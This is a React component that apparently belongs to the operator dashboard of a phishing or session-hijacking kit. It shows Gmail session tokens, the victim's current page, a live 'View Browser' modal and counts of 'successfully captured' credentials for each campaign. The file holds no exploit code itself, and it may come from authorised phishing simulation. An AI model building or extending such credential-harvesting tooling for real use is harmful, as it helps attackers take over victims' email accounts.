import React, { useState, useEffect, useRef } from 'react';
import httpClient from '../services/httpClient';
import GmailBrowserModal from '../Modals/GmailBrowserModal';

const GmailBrowserControl = ({ session, campaignId }) => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [sessionStatus, setSessionStatus] = useState('unknown');
  const [credentialsCount, setCredentialsCount] = useState(0);
  const [currentUrl, setCurrentUrl] = useState('');
  const [lastActivity, setLastActivity] = useState(null);

  useEffect(() => {
    if (session) {
      setSessionStatus(session.isActive ? 'active' : 'inactive');
      setCredentialsCount(session.credentialsCount || 0);
      setCurrentUrl(session.currentUrl || '');
      setLastActivity(session.createdAt ? new Date(session.createdAt) : null);
    }
  }, [session]);

  // Format time for display
  const formatTime = (date) => {
    if (!date) return 'Unknown';
    return new Date(date).toLocaleString();
  };

  // Format URL for display
  const formatUrl = (url) => {
    if (!url || url === 'unknown') return 'Loading...';
    try {
      const urlObj = new URL(url);
      return urlObj.hostname + urlObj.pathname;
    } catch {
      return url.substring(0, 50) + (url.length > 50 ? '...' : '');
    }
  };

  // Get status color
  const getStatusColor = () => {
    switch (sessionStatus) {
      case 'active':
        return 'text-green-400';
      case 'inactive':
        return 'text-red-400';
      default:
        return 'text-yellow-400';
    }
  };

  // Get status icon
  const getStatusIcon = () => {
    switch (sessionStatus) {
      case 'active':
        return (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
          </svg>
        );
      case 'inactive':
        return (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
          </svg>
        );
      default:
        return (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM7 9a1 1 0 000 2h6a1 1 0 100-2H7z" clipRule="evenodd" />
          </svg>
        );
    }
  };

  return (
    <>
      <div className="gmail-browser-control">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center space-x-3">
            <div className={`${getStatusColor()}`}>
              {getStatusIcon()}
            </div>
            <div>
              <h4 className="text-lg font-semibold" style={{ color: 'var(--cyber-primary)' }}>
                Gmail Session
              </h4>
              <p className="text-sm" style={{ color: 'var(--cyber-text-secondary)' }}>
                Token: {session.sessionToken.substring(0, 12)}...
              </p>
            </div>
          </div>
          
          <div className="flex items-center space-x-3">
            {credentialsCount > 0 && (
              <div className="gmail-session-badge success">
                {credentialsCount} credentials
              </div>
            )}
            <button
              onClick={() => setIsModalOpen(true)}
              className="gmail-action-btn flex items-center space-x-2"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
              </svg>
              <span>View Browser</span>
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
          <div>
            <label style={{ color: 'var(--cyber-text-secondary)' }}>Status</label>
            <div className={`flex items-center space-x-2 ${getStatusColor()}`}>
              <span className="capitalize">{sessionStatus}</span>
              <div className={`status-dot ${sessionStatus}`}></div>
            </div>
          </div>
          
          <div>
            <label style={{ color: 'var(--cyber-text-secondary)' }}>Current Page</label>
            <div style={{ color: 'var(--cyber-primary)' }} className="font-mono text-xs">
              {formatUrl(currentUrl)}
            </div>
          </div>
          
          <div>
            <label style={{ color: 'var(--cyber-text-secondary)' }}>Created</label>
            <div style={{ color: 'var(--cyber-primary)' }}>
              {formatTime(lastActivity)}
            </div>
          </div>
        </div>

        {credentialsCount > 0 && (
          <div className="credential-item mt-4">
            <div className="flex items-center space-x-2" style={{ color: 'rgb(74, 222, 128)' }}>
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span className="text-sm">
                Successfully captured {credentialsCount} credential{credentialsCount !== 1 ? 's' : ''}
              </span>
            </div>
          </div>
        )}

        <div className="mt-4 flex items-center justify-between text-xs" style={{ color: 'var(--cyber-text-secondary)' }}>
          <span>Session ID: {session.sessionToken}</span>
          <span>Campaign: {campaignId}</span>
        </div>
      </div>

      {/* Gmail Browser Modal */}
      {isModalOpen && (
        <GmailBrowserModal
          isOpen={isModalOpen}
          onClose={() => setIsModalOpen(false)}
          session={session}
          campaignId={campaignId}
        />
      )}
    </>
  );
};

export default GmailBrowserControl;
